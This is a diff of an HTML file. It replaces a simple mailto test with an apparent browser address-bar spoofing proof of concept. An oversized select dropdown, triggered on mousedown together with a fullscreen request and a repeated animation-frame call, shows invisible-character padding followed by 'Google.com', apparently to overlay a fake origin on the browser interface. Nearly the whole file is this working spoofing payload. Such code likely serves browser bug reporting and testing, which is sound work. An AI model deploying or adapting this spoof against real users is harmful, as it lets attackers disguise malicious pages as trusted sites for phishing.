@@ -1,7 +1,32 @@
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+        overflow-y: hidden;
+    }
+
+    select {
+        height: 9999px;
+        width: 9999px;
+        font-size: 9em;
+    }
+</style>
+
 <script>
-window.onload = function(){
-  var a = document.createElement("a");
-  a.href = "mailto:example@example.com?subject=Hello&body=This%20is%20a%20test";
-  a.click();
-};
+    function spoof() {
+        window.requestAnimationFrame(fillSelect);
+        document.documentElement.requestFullscreen();
+    }
+
+    function fillSelect() {
+        // increase the array index to extend select dropdown overlap duration
+        selectElement[641811] = optionElement;
+    }
 </script>
+
+<select id="selectElement" onmousedown="spoof()">
+    <option id="optionElement">
+        ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ Google.com
+    </option>
+</select>
